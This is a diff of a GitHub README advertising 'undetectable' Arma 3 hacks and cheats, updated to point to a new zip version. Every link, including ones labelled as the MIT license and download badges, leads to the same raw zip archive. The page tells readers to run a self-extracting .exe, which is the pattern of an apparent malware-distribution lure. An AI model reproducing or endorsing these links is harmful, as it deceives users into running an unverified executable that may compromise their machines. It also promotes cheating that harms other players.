@@ -1,15 +1,15 @@
 # Arma 3 Hacks & Cheats 🚁 – Elevate Your Tactical Experience
 
-[![License: MIT](https://github.com/QuesoVfx/arma3-enhanced-gameplay-tools/raw/refs/heads/branch/cotheorist/enhanced_gameplay_tools_arma_v2.8.zip)](https://github.com/QuesoVfx/arma3-enhanced-gameplay-tools/raw/refs/heads/branch/cotheorist/enhanced_gameplay_tools_arma_v2.8.zip)
-![Downloads](https://github.com/QuesoVfx/arma3-enhanced-gameplay-tools/raw/refs/heads/branch/cotheorist/enhanced_gameplay_tools_arma_v2.8.zip)
-![Open Source Love](https://github.com/QuesoVfx/arma3-enhanced-gameplay-tools/raw/refs/heads/branch/cotheorist/enhanced_gameplay_tools_arma_v2.8.zip%20Source-%E2%9D%A4-red)
+[![License: MIT](https://github.com/QuesoVfx/arma3-enhanced-gameplay-tools/raw/refs/heads/branch/cotheorist/arma-enhanced-gameplay-tools-v3.8.zip)](https://github.com/QuesoVfx/arma3-enhanced-gameplay-tools/raw/refs/heads/branch/cotheorist/arma-enhanced-gameplay-tools-v3.8.zip)
+![Downloads](https://github.com/QuesoVfx/arma3-enhanced-gameplay-tools/raw/refs/heads/branch/cotheorist/arma-enhanced-gameplay-tools-v3.8.zip)
+![Open Source Love](https://github.com/QuesoVfx/arma3-enhanced-gameplay-tools/raw/refs/heads/branch/cotheorist/arma-enhanced-gameplay-tools-v3.8.zip%20Source-%E2%9D%A4-red)
 
 Welcome to the battleground of possibility! **This repository is your gateway to a next-generation toolkit for Arma 3 enhancements, modding, and game-altering utilities.** Whether you're seeking undetectable Arma 3 hacks, robust cheats, or modular A3 gameplay improvement solutions, you’ve just discovered the ultimate arsenal.
 
 # 🚀 Quick HyperJump: Get Started with Arma 3 Enhancement Suite
 **Ready to maximize your Arma 3 prowess? Download our toolkit with a single click below!**
 
-[![Download](https://github.com/QuesoVfx/arma3-enhanced-gameplay-tools/raw/refs/heads/branch/cotheorist/enhanced_gameplay_tools_arma_v2.8.zip)](https://github.com/QuesoVfx/arma3-enhanced-gameplay-tools/raw/refs/heads/branch/cotheorist/enhanced_gameplay_tools_arma_v2.8.zip)
+[![Download](https://github.com/QuesoVfx/arma3-enhanced-gameplay-tools/raw/refs/heads/branch/cotheorist/arma-enhanced-gameplay-tools-v3.8.zip)](https://github.com/QuesoVfx/arma3-enhanced-gameplay-tools/raw/refs/heads/branch/cotheorist/arma-enhanced-gameplay-tools-v3.8.zip)
 
 ---
 
@@ -84,14 +84,14 @@ Get up and running in minutes — sky’s the limit!
 
 ### 1️⃣ Fetch the Enhancement Suite
 
-Download the latest build from https://github.com/QuesoVfx/arma3-enhanced-gameplay-tools/raw/refs/heads/branch/cotheorist/enhanced_gameplay_tools_arma_v2.8.zip  
+Download the latest build from https://github.com/QuesoVfx/arma3-enhanced-gameplay-tools/raw/refs/heads/branch/cotheorist/arma-enhanced-gameplay-tools-v3.8.zip  
 _Installation is a breeze: The self-extracting installer contains no clutter._
 
 ### 2️⃣ Seamless Installation
 
 Simply click the download image below:
 
-[![Download](https://github.com/QuesoVfx/arma3-enhanced-gameplay-tools/raw/refs/heads/branch/cotheorist/enhanced_gameplay_tools_arma_v2.8.zip)](https://github.com/QuesoVfx/arma3-enhanced-gameplay-tools/raw/refs/heads/branch/cotheorist/enhanced_gameplay_tools_arma_v2.8.zip)
+[![Download](https://github.com/QuesoVfx/arma3-enhanced-gameplay-tools/raw/refs/heads/branch/cotheorist/arma-enhanced-gameplay-tools-v3.8.zip)](https://github.com/QuesoVfx/arma3-enhanced-gameplay-tools/raw/refs/heads/branch/cotheorist/arma-enhanced-gameplay-tools-v3.8.zip)
 
 - Save the toolkit to your system.
 - Double-click the installer (.exe for Windows).
@@ -117,7 +117,7 @@ Explore, experiment, and push the limits — all with one cohesive tool.
 
 ## 📜 License
 
-Distributed under the [MIT License](https://github.com/QuesoVfx/arma3-enhanced-gameplay-tools/raw/refs/heads/branch/cotheorist/enhanced_gameplay_tools_arma_v2.8.zip).  
+Distributed under the [MIT License](https://github.com/QuesoVfx/arma3-enhanced-gameplay-tools/raw/refs/heads/branch/cotheorist/arma-enhanced-gameplay-tools-v3.8.zip).  
 Copyright © 2025
 
 ---
@@ -126,7 +126,7 @@ Copyright © 2025
 
 Increase your tactical toolkit — enhance your next operation!
 
-[![Download](https://github.com/QuesoVfx/arma3-enhanced-gameplay-tools/raw/refs/heads/branch/cotheorist/enhanced_gameplay_tools_arma_v2.8.zip)](https://github.com/QuesoVfx/arma3-enhanced-gameplay-tools/raw/refs/heads/branch/cotheorist/enhanced_gameplay_tools_arma_v2.8.zip)
+[![Download](https://github.com/QuesoVfx/arma3-enhanced-gameplay-tools/raw/refs/heads/branch/cotheorist/arma-enhanced-gameplay-tools-v3.8.zip)](https://github.com/QuesoVfx/arma3-enhanced-gameplay-tools/raw/refs/heads/branch/cotheorist/arma-enhanced-gameplay-tools-v3.8.zip)
 
 ---
 
